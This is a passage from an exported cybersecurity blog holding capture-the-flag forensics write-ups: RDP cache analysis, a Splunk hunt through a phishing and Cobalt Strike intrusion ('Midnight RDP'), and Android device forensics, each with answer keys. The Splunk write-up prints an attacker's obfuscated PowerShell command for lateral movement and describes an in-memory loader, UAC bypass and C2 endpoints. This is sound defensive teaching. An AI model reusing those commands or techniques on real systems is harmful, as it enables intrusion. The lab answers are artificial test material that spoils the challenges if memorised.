https://www.cyberengage.org/post/analyzing-and-extracting-bitmap-cache-files-from-rdp-sessions\nThese files are located in C:\\Users\\user\\AppData\\Local\\Microsoft\\Terminal Server Client\\Cache\\.\nWe used the ANSSI \u0026ldquo;BMC-Tools\u0026rdquo; to parse \u0026amp; export the cache, and then BSI Bund\u0026rsquo;s \u0026ldquo;RdpCacheStitcher\u0026rdquo; to analyze them:\nBy reconstructing the cached images, we can see the attacker used \u0026ldquo;NetBScanner\u0026rdquo; to scan the network.\nAnswer: NetBScanner\nQuestion 12 #\rWhen was the event log deleted by the attacker? (UTC)\nLet\u0026rsquo;s circle back to what we discovered in Question 1:\nAnswer: 2024-06-28 14:03:25\nQuestion 13 #\rWhat time did attacker disconnect session to 192.168.70.129? (UTC)\nRight after the event logs were cleared, we see an \u0026ldquo;An account was logged off\u0026rdquo; entry:\nAnswer: 2024-06-28 14:03:53\nLab completed!\n","date":"10 March 2025","externalUrl":null,"permalink":"/blog-cyber/en/posts/latus/","section":"Posts","summary":"Scénario #\rOur customer discovered illegal RDP sessions without Privileged Access Management (PAM) in their system on June 28.","title":"Latus","type":"posts"},{"content":"","date":"2 March 2025","externalUrl":null,"permalink":"/blog-cyber/en/tags/cyberdefenders/","section":"Tags","summary":"","title":"Cyberdefenders","type":"tags"},{"content":"\rScenario #\rAn IT employee at InfiniTech Solutions reported unusual activity associated with their email account. During the investigation, it was discovered that the employee\u0026rsquo;s work credentials had been exposed in a recent data breach.\nThe employee had used their work email address to sign up on a third-party platform, which exposed their credentials. Malicious actors exploited these credentials to access the employee\u0026rsquo;s email account and send phishing emails to other employees within the organization.\nYour task is to investigate this incident by analyzing logs, determining the extent of the attack, identifying whether users interacted with the phishing emails, and uncovering the impact of the phishing campaign on the network.\nSetup #\rFor this investigation scenario, we will primarily use Splunk Search to analyze the logs. Additionally, we\u0026rsquo;ll use other tools such as xml.onlineviewer, Cyberchef, and VirusTotal.\nReminders #\rSplunk is an analysis platform that allows you to collect, index, and search data generated by systems, applications, and network devices. It retrieves its logs through various mechanisms such as agents installed on endpoints, log file ingestion, or even APIs.\nOnce collected, the data is indexed, which helps to organize and facilitate the search process. Splunk uses the SPL (Search Processing Language) to query this data.\nInitial Access #\rQuestion 1 #\rWhich email account was compromised and used to launch the attack?\nFirst, let\u0026rsquo;s check the available \u0026ldquo;sourcetypes\u0026rdquo; on our system:\nindex=\u0026#34;main\u0026#34; | stats count by sourcetype Sourcetypes in Splunk are labels that indicate the type of data or the origin of the collected events.\nTo answer this question, we\u0026rsquo;ll focus on the \u0026ldquo;syslog\u0026rdquo; first. Syslogs gather logs generated by various devices and usually contain detailed information about system and security activities.\nTo speed things up and avoid being flooded with information, we\u0026rsquo;ll search with a regex to only display email addresses:\n* sourcetype=syslog | regex _raw=\u0026#34;[\\w\\.-]+@[\\w\\.-]+\\.\\w+\u0026#34; We see a lot of logs, so to make our task easier, we\u0026rsquo;ll count how many times each email address appears and display the results in a table:\n* sourcetype=syslog | rex field=_raw \u0026#34;(?\u0026lt;email\u0026gt;[\\w\\.-]+@[\\w\\.-]+\\.\\w+)\u0026#34; | stats count by email | sort -count | head 10 | rename count AS \u0026#34;Number of occurrences\u0026#34;, email AS \u0026#34;Email address\u0026#34; We can even visualize this as a graph:\nAnswer: twhite@infinitechsolutions.xyz\nQuestion 2 #\rAfter identifying the compromised account, the attacker sent phishing emails to other employees in the company. What are the names of these employees, listed in chronological order and separated by commas?\nThe email sending log format is as follows:\nUser [sender_email] [IP_address]; Message [message_ID] for [recipient_email] For the search, we run:\n* sourcetype=syslog \u0026#34;User twhite@infinitechsolutions.xyz\u0026#34; | rex field=_raw \u0026#34;Message \u0026lt;[^\u0026gt;]+\u0026gt; for (?\u0026lt;recipient\u0026gt;[\\w\\.-]+@[\\w\\.-]+\\.\\w+)\u0026#34; | table _time recipient | sort _time | stats list(recipient) as recipients | eval recipients=mvjoin(recipients, \u0026#34;, \u0026#34;) This query allows us to identify and list the recipients in chronological order.\nIndeed, we select the user from the compromised account and use a regex to extract and store the recipient\u0026rsquo;s email address in a variable.\nThen, we sort the results chronologically and format the output for readability.\nAnswer: rnichols,llopez,gbaker,ahall\nQuestion 3 #\rWhat is the name of the malicious attachment sent from the compromised account?\nThis question gave me more trouble than I expected. Initially, I searched:\n* sourcetype=syslog \u0026#34;User twhite@infinitechsolutions.xyz\u0026#34; | regex _raw=\u0026#34;for (rnichols|llopez|gbaker|ahall)@infinitechsolutions\\.xyz\u0026#34; However, there was no trace of any attachment. I then thought, \u0026ldquo;Hmm, I must not be on the right sourcetype; I\u0026rsquo;ll search the others.\u0026rdquo;\nSo I searched:\nindex=* \u0026#34;twhite@infinitechsolutions.xyz\u0026#34; | stats count by sourcetype Only syslog is available, so I\u0026rsquo;m on the right sourcetype. I then continued to think and decided, \u0026ldquo;I\u0026rsquo;ll bypass the formatting issue and simply search for file extensions.\u0026rdquo;\nI asked ChatGPT for a list of extensions and ended up with this query:\nindex=* sourcetype=syslog twhite@infinitechsolutions.xyz | rex field=_raw \u0026#34;attachment=(?\u0026lt;malicious_attachment\u0026gt;[\\w\\.-]+\\.(exe|zip|pdf|docx|xlsm|js|vbs|scr|bat))\u0026#34; | table _time malicious_attachment | sort _time Still nothing, no attachment was found.\nSince I was still stuck, I decided to think differently. The lab title is \u0026ldquo;Midnight RDP\u0026rdquo;, which reminded me of the APT known as \u0026ldquo;Midnight Blizzard\u0026rdquo;.\nDuring my research, I came across an article titled \u0026ldquo;How Midnight Blizzard Uses Malicious .RDP Files to Exploit Windows Systems: A Technical Guide\u0026rdquo; (by Yua Mikanana).\nWell, given the lab title, it was obvious. So I searched for \u0026ldquo;.RDP\u0026rdquo; and obtained the file:\nAnswer: cloud zerotrust compliance.rdp\nExecution #\rQuestion 1 #\rAfter analyzing user interactions, which employee downloaded and executed the malicious attachment?\nWe change the sourcetype, moving over to WinEventLog.\nWinEventLog corresponds to Windows event logs, which record various system activities (like errors, warnings, security information, or application events) to allow tracking and analysis of events on a Windows system.\nindex=* sourcetype=\u0026#34;xmlwineventlog\u0026#34; cloud zerotrust compliance.rdp Here, we can clearly see the username of the user who downloaded the file: C:\\Users\\rnichols\\Downloads\\cloud zerotrust compliance.rdp\nAnswer: rnichols\nQuestion 2 #\rOn the DC machine, a DLL tag was executed by the attacker in memory. What are the first 10 bytes of the SHA-256 hash of this malicious DLL file?\nFirst, let’s list the DLLs related to PowerShell on the DC:\nindex=* sourcetype=xmlwineventlog \u0026#34;Powershell\u0026#34; | search host=\u0026#34;DC01\u0026#34; | rex field=_raw \u0026#34;(?\u0026lt;file\u0026gt;\\b\\w{6,8}\\.\\w{3}\\b)\u0026#34; | search file=\u0026#34;*dll\u0026#34; We notice that the complete script is too long to be recorded in a single event. It is therefore split into segments. This can be observed thanks to the MessageNumber:\nThe two events share the same ActivityID {0B39225B-3C43-0001-5078-390B433CDB01} as well as other identifiers, indicating that they belong to the same script execution.\nThe first segment (MessageNumber = 1) contains the beginning of the script, including the configuration of the PowerShell environment and the definition of functions such as func_get_proc_address and func_get_delegate_type.\nThe last segment (MessageNumber = 33) contains the end of the script, notably the part that decodes a Base64 string (XOR’d with the key 35) and allocates memory to execute the decoded code.\nTogether, these segments reassemble the entire payload which is likely intended to inject and execute code in memory.\nOnce reassembled, the script decodes an obfuscated payload (first Base64, then XOR’d with 35) and uses native Windows functions (like VirtualAlloc via GetProcAddress and GetDelegateForFunctionPointer) to allocate memory and execute the malicious code.\n[...] $var [...] -bxor 35 [...] We can reassemble it using a Splunk search:\nindex=* sourcetype=xmlwineventlog EventID=4104 0B39225B-3C43-0001-5078-390B433CDB01 | stats values(ScriptBlockText) as Script by SystemTime | table Script We can then decode the script using Cyberchef:\nWe find our DLL in question:\nFinally, we extract the file and retrieve its hash:\nAnswer: 0ee6bc20a7f855d881cce962de09c77960ea5c85ca013e3d123fce61109ff8c5\nPersistence #\rQuestion 1 #\rAfter the malicious connection was established, a file was dropped on the system. What is the name of this dropped file?\nWe know that the .rdp file was executed around 20:45:27 (see Question 1 from the Execution section).\nSo, we\u0026rsquo;ll start our search from that moment.\nFirst, I tried searching in Splunk for downloads using PowerShell commands (Invoke-WebRequest, curl, etc.), but that didn’t yield anything.\nI then modified my search:\nindex=* sourcetype=\u0026#34;xmlwineventlog\u0026#34; \u0026#34;rnichols\u0026#34; | rex field=_raw \u0026#34;CommandLine=(?\u0026lt;CommandLine\u0026gt;.*)\u0026#34; | fillnull value=\u0026#34;\u0026#34; | search NOT CommandLine=\u0026#34;\u0026lt;/Data\u0026gt;\u0026lt;/EventData\u0026gt;\u0026lt;/Event\u0026gt;\u0026#34;,\u0026#34;\u0026#34; | stats values(CommandLine) as CommandLine by _time, ParentCommandLine | sort — _time So why does this work?\nHere are the event details:\nThe field TerminalSessionId=3 strongly suggests that the user was connected via an RDP session, because:\nSession 0 is often used by SYSTEM. Local interactive sessions usually start at 1. RDP sessions often have higher IDs (such as 2, 3, etc.). explorer.exe is the main process of the Windows graphical interface and acts as a launcher for programs started by an interactive user.\nPossible scenarios explaining this behavior:\nInteractive session (RDP or not):\nIf rnichols connected via RDP, explorer.exe was launched as the user shell and executed the programs defined in Startup (ztssvc.exe). This situation can also occur even without RDP if the user logs in physically or through a service like runas. Automatic execution at user login:\nSince ztssvc.exe is in Startup, it is executed as soon as the user logs in (whether locally or via RDP). Injection or Persistence via explorer.exe:\nIf an attacker persisted malware via Startup, explorer.exe will automatically run that binary when a user logs in. Exploit or forced execution by an attacker:\nIf explorer.exe was compromised (for example, through DLL injection or another technique), it could have been used to execute ztssvc.exe. Answer: ztssvc.exe\nQuestion 2 #\rTo maintain long-term access, the attacker created a scheduled task on the compromised machine. What is the name of this task?\nindex=* sourcetype=\u0026#34;xmlwineventlog\u0026#34; EventCode=4698 OR EventCode=4702 | search user=\u0026#34;rnichols\u0026#34; | table _time EventCode TaskName Command User | rename EventCode as \u0026#34;Event ID\u0026#34;, TaskName as \u0026#34;Scheduled Task\u0026#34;, Command as \u0026#34;Executed Command\u0026#34; | sort _time Question 3 #\rAs part of their persistence strategy, the attacker created a new user account. What is the name of this unauthorized account?\nUsing the same query as in Question 1:\nindex=* sourcetype=\u0026#34;xmlwineventlog\u0026#34; \u0026#34;rnichols\u0026#34; | rex field=_raw \u0026#34;CommandLine=(?\u0026lt;CommandLine\u0026gt;.*)\u0026#34; | fillnull value=\u0026#34;\u0026#34; | search NOT CommandLine=\u0026#34;\u0026lt;/Data\u0026gt;\u0026lt;/EventData\u0026gt;\u0026lt;/Event\u0026gt;\u0026#34;,\u0026#34;\u0026#34; | stats values(CommandLine) as CommandLine by _time, ParentCommandLine | sort — _time Within the results, you can find an encoded PowerShell command that looks very suspicious:\nWe take this command and decode it using Cyberchef:\nAnswer: Administrator\nQuestion 4 #\rTo facilitate remote access, the attacker modified the remote desktop settings. What is the name of the registry key that determines whether RDP (Remote Desktop Protocol) connections are allowed?\nHaving already investigated and administered quite a few Windows systems, I already knew the answer. Nevertheless, here’s how to find it:\nWe always search for PowerShell commands with -EncodedCommand, as the attacker executed several:\nWithin these, you can see this command:\nAnswer: fDenyTSConnections\nQuestion 5 #\rFurther investigation revealed the creation of a new user account on the DC. What is the name of this account?\nWe can assume that this was done in the same way as on the other host. So we search with:\nindex=* sourcetype=\u0026#34;xmlwineventlog\u0026#34; host=\u0026#34;DC01\u0026#34; \u0026#34;-EncodedCommand\u0026#34; Answer: rniclos\nPrivilege Escalation #\rQuestion 1 #\rWhen examining the privilege escalation technique, what are the last 6 bytes of the CLSID of the privileged COM interface that the attacker exploited?\nThe CLSID is a globally unique identifier (GUID) used by Windows COM (Component Object Model) to identify COM objects in the registry.\nAttackers use CLSIDs of privileged COM interfaces to execute code with elevated privileges:\nThey exploit misconfigured COM objects to escalate their privileges. An attacker can create, manipulate, or call a privileged COM interface* via regsvr32.exe, powershell, mshta.exe, or rundll32.exe. Here, we know that the malware is ztssvc.exe. So we search for all EventCode \u0026ldquo;1\u0026rdquo; (process creation) events related to the execution of ztssvc.exe and filter only those with an IntegrityLevel of \u0026ldquo;High\u0026rdquo;:\nindex=* sourcetype=\u0026#34;xmlwineventlog\u0026#34; EventCode=1 | search Image=\u0026#34;*ztssvc.exe*\u0026#34; | search IntegrityLevel=\u0026#34;High\u0026#34; | table _time User CommandLine IntegrityLevel ParentCommandLine | sort _time Answer: 7CE93B6DC937\nQuestion 2 #\rTo elevate their privileges, the attacker dropped another file on the system. What is the name of this file?\nWe run the same command and review everything that happened after the download of the first file (ztssvc.exe):\nindex=* sourcetype=\u0026#34;xmlwineventlog\u0026#34; \u0026#34;rnichols\u0026#34; | rex field=_raw \u0026#34;CommandLine=(?\u0026lt;CommandLine\u0026gt;.*)\u0026#34; | fillnull value=\u0026#34;\u0026#34; | search NOT CommandLine=\u0026#34;\u0026lt;/Data\u0026gt;\u0026lt;/EventData\u0026gt;\u0026lt;/Event\u0026gt;\u0026#34;,\u0026#34;\u0026#34; | search NOT ParentCommandLine=\u0026#34;\u0026#34; | stats values(CommandLine) as CommandLine by _time, ParentCommandLine | sort — _time Answer: Akagi64.exe\nDefense Evasion #\rQuestion 1 #\rThe attacker attempted to modify the system behavior to weaken security settings. What is the name of the registry key that governs the User Account Control (UAC) prompt settings for administrative users?\nThe answer can be found in the encoded PowerShell commands we observed earlier:\nAnswer: ConsentPromptBehaviorAdmin\nQuestion 2 #\rTo avoid detection, the attacker moved the tag into a protected system directory. What is the name of this moved malicious file?\nIf a move occurred, there should be a file creation or renaming event (Event ID 11 or 2).\nindex=* sourcetype=xmlwineventlog EventCode=11 OR EventCode=2 \u0026#34;rnichols\u0026#34; | search TargetFilename=\u0026#34;C:\\\\Windows\\\\System32\\\\*\u0026#34; OR TargetFilename=\u0026#34;C:\\\\Windows\\\\SysWOW64\\\\*\u0026#34; OR TargetFilename=\u0026#34;C:\\\\ProgramData\\\\*\u0026#34; | table _time User TargetFilename ProcessName | sort _time Answer: Amazon ZeroTrust Compl.exe\nDiscovery #\rQuestion 1 #\rBy determining the attacker\u0026rsquo;s first action on the compromised machine, what was the first command executed to gather system information?\nKnowing that the machine was compromised at 20:45:27 (see Question 1 from the Execution section), we start our search from that time:\nindex=* sourcetype=\u0026#34;xmlwineventlog\u0026#34; \u0026#34;rnichols\u0026#34; | rex field=_raw \u0026#34;CommandLine=(?\u0026lt;CommandLine\u0026gt;.*)\u0026#34; | fillnull value=\u0026#34;\u0026#34; | search NOT CommandLine=\u0026#34;\u0026lt;/Data\u0026gt;\u0026lt;/EventData\u0026gt;\u0026lt;/Event\u0026gt;\u0026#34;,\u0026#34;\u0026#34; | search NOT ParentCommandLine=\u0026#34;\u0026#34; | stats values(CommandLine) as CommandLine by _time, ParentCommandLine | sort — _time Answer: whoami /groups\nLateral Movement #\rQuestion 1 #\rWhich tool did the attacker use to move laterally to the DC?\nOnce again, we need to investigate the encoded PowerShell commands, this time those issued by Amazon ZeroTrust Compl.exe.\npowershell -nop -exec bypass -EncodedCommand UwBlAHQALQBJAHQAZQBtACAAVwBTAE0AYQBuADoAXABsAG8AYwBhAGwAaABvAHMAdABcAEMAbABpAGUAbgB0AFwAVAByAHUAcwB0AGUAZABIAG8AcwB0AHMAIAAtAFYAYQBsAHUAZQAgACIARABDADAAMQAuAGEAZAAuAGkAbgBmAGkAbgBuAGkAdABlAGMAaABzAG8AbAB1AHQAZQBuAHMALgB4AHkAegAiACAALQBGAG8AcgBjAGUA This command modifies the Windows Remote Management (WinRM) settings on IT01 to trust DC01.ad.infinitechsolutions.xyz for remote connections. It’s a strong indicator of lateral movement via PowerShell Remoting (WinRM).\nAnswer: WinRM\nCommand \u0026amp; Control #\rQuestion 1 #\rTracing back the attacker’s activities, what was the IP address from which the malicious emails were sent?\nWe go back to the very first questions by searching for the user who sent the phishing emails:\nindex=* sourcetype=syslog \u0026#34;User twhite@infinitechsolutions.xyz\u0026#34; Answer: 3.78.253.99\nQuestion 2 #\rSince cloud zerotrust compliance.rdp was executed on IT01 and we know the sender’s email IP address, we can directly test with:\nindex=* sourcetype=xmlwineventlog (EventCode=1 OR EventCode=3) | search host=\u0026#34;IT01\u0026#34; | search DestinationPort=3389 AND DestinationIp=3.78.253.99 | table _time User DestinationIp DestinationPort | sort _time Answer: 3.78.253.99:3389\nQuestion 3 #\rAnalysis revealed that the dropped file acts as a Cobalt Strike beacon. What is the endpoint of the command and control (C\u0026amp;C) server with which this beacon communicates?\nFirst, let’s verify which file is the Cobalt Strike beacon:\nThen, we continue the investigation by checking which IP/port Amazon ZeroTrust Compl.exe connected to:\nindex=* sourcetype=xmlwineventlog EventCode=3 | search Image=\u0026#34;*Amazon ZeroTrust Compl.exe*\u0026#34; | search NOT DestinationIp=\u0026#34;\u0026#34; | table _time User Image DestinationIp DestinationPort Protocol | sort _time (EventCode 3 corresponds to a network connection established by a process on a Windows machine)\nAnswer: 3.78.244.11:8080\nQuestion 4 #\rBy examining the DLL configuration, what value is associated with the \u0026lsquo;C2Server\u0026rsquo; key that directs the beacon’s communication?\nWe return to VirusTotal and find this information in the \u0026ldquo;Behavior\u0026rdquo; tab.\nAnswer: 3.78.244.11,/dot.gif\nLab completed!\n","date":"2 March 2025","externalUrl":null,"permalink":"/blog-cyber/en/posts/midnight-rdp/","section":"Posts","summary":"Scenario #\rAn IT employee at InfiniTech Solutions reported unusual activity associated with their email account.","title":"Midnight RDP Lab","type":"posts"},{"content":"","date":"2 March 2025","externalUrl":null,"permalink":"/blog-cyber/en/tags/splunk/","section":"Tags","summary":"","title":"Splunk","type":"tags"},{"content":"","date":"2 March 2025","externalUrl":null,"permalink":"/blog-cyber/en/tags/threat-hunting/","section":"Tags","summary":"","title":"Threat Hunting","type":"tags"},{"content":"","date":"19 May 2024","externalUrl":null,"permalink":"/blog-cyber/en/tags/android-forensic/","section":"Tags","summary":"","title":"Android Forensic","type":"tags"},{"content":"","date":"19 May 2024","externalUrl":null,"permalink":"/blog-cyber/en/tags/autopsy/","section":"Tags","summary":"","title":"Autopsy","type":"tags"},{"content":"","date":"19 May 2024","externalUrl":null,"permalink":"/blog-cyber/en/tags/medium/","section":"Tags","summary":"","title":"Medium","type":"tags"},{"content":"\rScenario #\rWe have successfully confirmed the location of the malicious actor who compromised our government’s WiFi network.\nRecently, a dawn raid was conducted as part of OP ERADICATE at an address in the Velorian capital, resulting in the seizure of a substantial amount of evidence. Notably, an Android device belonging to the agent was confiscated, and it is believed to have been at the scene of the attack.\nWe require your expertise to analyze this device and answer the detailed questions below. Time is limited; a Velorian COBR meeting has been organized to discuss your findings\u0026hellip;\nFiles #\ropshieldwall2.zip containing \u0026ldquo;EVIDENCE-CASE-RAVENSKIAN-AGENT-002,\u0026rdquo; which includes the \u0026ldquo;data\u0026rdquo; and \u0026ldquo;storage\u0026rdquo; folders of an Android device. This provides a significant amount of room for analysis, as the /data directory contains a wealth of information, such as:\nCheatsheet SANS FOR585\rForeword #\rBefore we begin, here is some important information about Android:\nUser data on Android can be stored both internally and externally. Internal data is saved in NAND flash memory, a non-volatile memory that retains data even when the power is off. NAND stores the bootloader, the operating system, and user data. Application data is stored on NAND flash memory or on the SD card.\nAndroid is based on variants of the Long-Term Support (LTS) branches of the Linux Kernel. With Android v8 (Oreo), Google required the use of Linux Kernel version 4.4 or higher. For example, Android v9 (Pie) runs on versions 4.4, 4.9, or 4.14, depending on the device. More information is available on the Android OS wiki: https://source.android.com/docs/core/architecture/kernel/android-common?hl=en.\nandroid-mainline is the primary development branch for Android features. The mainline Linux branch is merged with android-mainline every time Linus Torvalds releases a version or release candidate:\nCommonly found file systems include:\nEXT4 F2FS YAFFS2 exFAT Most artifacts are stored as SQLite databases and XML files. Android isolates applications at the kernel level, assigning each one a unique identifier (UID) to track running applications.\nAndroid Architecture #\rThe Linux kernel forms the foundation of Android, supporting essential features like threads and low-level memory management used by Android Runtime (ART).\nThe Hardware Abstraction Layer (HAL) provides standardized interfaces that expose hardware functionality to higher-level Java APIs. It consists of library modules specific to each hardware component (such as the camera or Bluetooth). When an API accesses hardware, Android loads the corresponding library module.\nThe Android Runtime (ART) environment runs each application in its own process and instance. ART manages multiple virtual machines on low-memory devices, using DEX bytecode specially designed and optimized for Android. Compilation tools like d8 transform Java code into DEX bytecode for execution on Android.\nMany essential Android system components and services, such as ART and HAL, are created from native code requiring native libraries written in C and C++.\nAndroid\u0026rsquo;s features are accessible via Java APIs, facilitating the reuse of key modular system components and services like notifications, resource management, and localization.\nSystem applications are the core set of apps that come with Android.\nAndroid Virtual Machine #\rVirtual Machines (VMs) act as abstraction layers between an application and the underlying Android device.\nEach application runs in its own instance within a VM, isolating it from other applications.\nAndroid applications are written in Java but are compiled into Java bytecode.\nThis bytecode is then transformed into Dalvik bytecode (.dex files) or ART bytecode.\nDalvik and ART run the bytecode (.dex) in a virtual machine, allowing applications to function independently of the underlying hardware.\nBefore KitKat (v.4.4), Android used Dalvik VMs.\nStarting with Lollipop (v5.0), Android began using Android Runtime (ART) and phased out Dalvik VM.\nBoth Dalvik and ART use DEX bytecode, but ART includes new optimization features.\nDirectory Structure #\r/cache: Can contain Gmail attachments, downloads, browsing data, and OTA updates. /efs: Contains files necessary for device operation in case of failure. /data: /data/data: Contains application folders (/data/data/com.example.app), app configuration files, SQLite databases, logs, cache, etc. /app: Stores .apk files from the Android market. *Malware may be found here. /backup: Stores backup APIs for developers; user backup data is not stored here. /media: Internal storage equivalent to an SD card. *Malware may be found here. /misc: Stores files related to Bluetooth, DHCP, VPN, Wi-Fi, etc. /system: Contains key files such as gesture.key and passwords.key; the accounts.db file, which stores usernames and passwords for file authentication, etc. /property: Stores system properties, including timezone, language settings, etc. /mnt: /asec: Stores unencrypted app data. /DCIM: Stores album thumbnails. /Pictures: Stores camera images. /downloads: Locally downloaded files. /secure/asec: Stores encrypted app data. /system: /app: Contains .apk files. *Malware may be found here. /priv-app: Contains .apk files with system-level permissions. *Malware may be found here. For more information on:\nApp permissions: https://developer.android.com/guide/topics/permissions/overview?hl=en, https://blog.mindorks.com/what-are-the-different-protection-levels-in-android-permission/ Android CLI: https://developer.android.com/tools/adb?hl=en Setup #\rGiven the files and the scenario, I will use the Autopsy tool. Setting it up may take some time, so I’m starting with it here.\nIf you\u0026rsquo;re unfamiliar with Autopsy, here’s a brief description:\nAutopsy is an open-source digital investigation tool. It serves as the graphical interface for the Sleuth Kit and other forensic tools. It is commonly used to analyze hard drives and smartphones in the context of investigations. Key features of Autopsy include deleted file recovery, metadata analysis, keyword searching, timeline visualization, file system analysis, and more.\nTo use it, we need to create a \u0026ldquo;Case\u0026rdquo;:\nHere, we know we’re not dealing with a \u0026ldquo;Disk Image\u0026rdquo; or a VM, nor a local disk. Therefore, we select the appropriate option, \u0026ldquo;Logical Files\u0026rdquo;:\nWe wait for Autopsy and its modules to complete the ingestion process. This may take some time.\nAll set, we can begin the investigation:\nQuestions #\rQuestion 1 #\rWhat is the email address used by the agent in various applications/services? To answer this, I will use the report generated by Autopsy via ALEAPP (Android Logs Events And Protobuf Parser), an open-source project aimed at parsing all known Android artifacts for forensic analysis.\nTo find it quickly and easily, we can search in:\n/data/data/com.android.vending/databases/library.db to find the Google account used to download apps. /data/data/com.android.providers.contacts/databases/contacts2.db to find the Google account used to sync contacts. Additionally (not applicable in this challenge):\n/data/com.android.vending/shared_prefs/lastaccount.xml (last account used on Google PlayStore for Android 9 and later). /data/com.google.android.gms/shared_prefs/BackupAccount.xml (email for backup account). /data/com.android.email/databases/EmailProvider.db (email accounts, 3rd-party app data, and messages associated with email notifications). Finally, we end up with the HTML report:\nThe email address can be found in various places.\nFor example, in the \u0026ldquo;Chrome\u0026rdquo; app under \u0026ldquo;Autofill\u0026rdquo; (a feature that automatically fills in forms with saved information):\nIn the Chrome \u0026ldquo;Login Data\u0026rdquo;:\nAnd in the \u0026ldquo;Installed Apps (Library)\u0026rdquo; section, we find the Google account email used for app downloads:\nAnswer: olegpachinksy@gmail.com\nQuestion 2 #\rWhat is the contact number of the handler assigned to the arrested agent?\nIn the \u0026ldquo;Contacts\u0026rdquo; section:\nAnswer: +323145232315\nQuestion 3 #\rRetrieve the credentials and link to the official portal for Ravenski agents. This could provide an intelligence advantage by using this access to gather actionable information about upcoming operations planned by the Ravenski government.\nWe already found the answer to this question in Question 1 via Chrome \u0026ldquo;Login Data\u0026rdquo;:\nAnswer: agent.ravensk.idu.com:olegpachinksy007:HBLKNKD0MADsdfsa2334(*\u0026amp;DSMDB\nQuestion 4 #\rWhat is the contact code used to confirm the identity of the agent and handler when using a secure chat channel?\nFirst, I’ll check for potential SMS messages here: /data/data/com.android.providers.telephony/databases/mmssms.db.\nNothing found.\nWe could also check here, though not applicable in this challenge:\n/data/com.google.android.gms/databases/icing_mmssms.db (SMS/MMS). /data/com.google.android.gms/databases/ipa_mmssms.db (SMS/MMS). We need to find the messaging app used. In Autopsy’s \u0026ldquo;Installed Programs\u0026rdquo; section, we can view all installed apps:\nDifferent categories are shown:\nInstalled Apps (GMS) Installed Apps (Library) Installed Apps (Vending) Installed Apps - GMS: This category refers to apps installed on the device, regardless of their installation method. Data can be found here: /data/com.google.android.gms/databases/.\nInstalled Apps - Library: This category refers to the app library for the Google user on the device. It may contain apps installed by the same Google account on another device or a previous installation. Data is stored here: /data/com.android.vending/databases/.\nInstalled Apps - Vending: This category specifically refers to apps installed via the Google Play Store. Data is retained even if the app is uninstalled and is located here: /data/com.android.vending/databases/.\nFor clarity, let’s return to ALEAPP and focus on \u0026ldquo;Vending\u0026rdquo; type apps:\nThe app that stands out is mega.privacy.android.app. Indeed, it’s a messaging application:\nALEAPP has parsed messages exchanged via MEGA:\nWe can find this information here: /data/data/mega.privacy.android.app/karere-TU1IaTh4TUJpdTQKAfO_2P0qU8NMP7zDRlgv.db.\nAnswer: REDAPPLEONACAR\nQuestion 5 #\rThe handler shared a document with the agent using a cloud storage service. When was this file shared with the agent?\nNothing found in messages. The document must have been sent another way. We know there’s no other messaging app, and it couldn’t have been sent via SMS/MMS.\nIn the installed apps, we saw com.google.android.apps.docs. Let’s check here: \\data\\data\\com.google.android.apps.docs.\nWe find the database /data/data/com.google.android.apps.docs/app_cello/olegpachinksy@gmail.com/cello.db containing this information:\nThe file can also be found here: EVIDENCE-CASE-RAVENSKIAN-AGENT-002/storage/emulated/0/Download/Debrief-Velorian OP Expansion East.pdf:\nNote: Autopsy interprets timestamps using your computer’s time zone by default. Remember to adjust this setting in Autopsy (Tools \u0026gt; Options \u0026gt; View \u0026gt; Time Zone).\nAnswer: 2024-04-01 09:36:41\nQuestion 6 #\rWhat is the download URI for the previously identified shared file?\nWe know the file was downloaded, as we found it in /storage/emulated/0/Download/.\nThus, we can search in /data/data/com.android.providers.downloads/databases/downloads.db:\nAnswer: https://www.googleapis.com/drive/v2internal/files/1iQKKlBU2vuJD1Xet6IYPt7IODVtDHxv1?alt=media\u0026amp;source=downloadUrl\u0026amp;auditContext=fileAction\u0026amp;reason=909\u0026amp;syncType=1\u0026amp;featureLabel=android-sync-classic\u0026amp;openDrive=false\u0026amp;errorRecovery=false\u0026amp;originatorApp=102\nQuestion 7 #\rTo gather further intelligence for Veloria’s counter-espionage efforts, what was the primary objective of this cyber operation led by the Ravenski government?\nReturning to the document:\nAnswer: Infiltrate the Velorian secured network to gather intelligence on upcoming cyber-attacks, their techniques, and target countries.\nQuestion 8 #\rIdentifying the handler is also crucial for Velorian law enforcement to understand the scope of this operation. What is the handler’s email address?\nWe already saw this in the MEGA app messages:\nAnswer: ivoryalex783@gmail.com\nQuestion 9 #\rWhat is the name of the place where the agent and handler met?\nReturning to the messages:\nThis question took the most time; I spent about an hour on it.\nInitially, I searched the usual locations:\n/data/com.google.android.apps.maps/databases/gmm_storage.db /data/com.google.android.apps.maps/databases/search_history.db /data/com.google.android.apps.maps/databases/da_destination_history /data/com.sec.android.daemonapp/db/weatherClock /data/com.google.android.apps.maps/app_tts-cache/ /data/com.google.android.apps.maps/cache/image_manager_disk_cache/ After finding nothing, I thought the answer might be in the metadata of images on the phone. Indeed, there were 48 images, several of which showed bars:\nHowever, nothing conclusive.\nI then questioned:\nAre there other navigation/location apps on the phone? Is it certain I should look in the Google Maps app? No, only Google Maps. No, it’s possible the search was made in the browser instead. After checking typical Google Maps artifacts, I decided to search in the browser but found nothing.\nSo I returned to digging through Google Maps artifacts:\napp: nothing relevant app_offline_downloads: nothing relevant app_offline_hashes: nothing relevant app_textures: nothing relevant app_webview: nothing relevant cache: nothing relevant databases: too many files, will revisit files: \u0026ldquo;new_recent_history_cache_search.cs\u0026rdquo; It turns out I could have simply searched for the keyword \u0026ldquo;Pub\u0026rdquo; 🤡\nAnswer: Levstik Pub\nQuestion 10 #\rAccording to the chat between the agent and handler, it appears that the handler sent the agent an image related to the infrastructure used by the Ravenski government for this cyber-espionage operation. What C2 framework is used by the Ravenski government?\nHaving already reviewed all images for Question 9, I have the answer.\nAnswer: Empire\nQuestion 11 #\rCollecting information on infrastructure, such as IP addresses or hostnames, is crucial for Velorian authorities as they prepare a counter-offensive. Based on the recovered image sent by the handler to the agent, what is the IP address of one of the C2 servers operated by Ravenski threat actors?\nAnswer: 98.24.12.45\n","date":"19 May 2024","externalUrl":null,"permalink":"/blog-cyber/en/posts/opshieldwall-2/","section":"Posts","summary":"Scenario #\rWe have successfully confirmed the location of the malicious actor who compromised our government’s WiFi network.","title":"OpShieldWall-2","type":"posts"},{"content":"","date":"7 May 2024","externalUrl":null,"permalink":"/blog-cyber/en/tags/easy/","section":"Tags","summary":"","title":"Easy","type":"tags"},{"content":"","date":"7 May 2024","externalUrl":null,"permalink":"/blog-cyber/en/tags/network-forensic/","section":"Tags","summary":"","title":"Network Forensic","type":"tags"},{"content":"\rScenario #\rThank you for 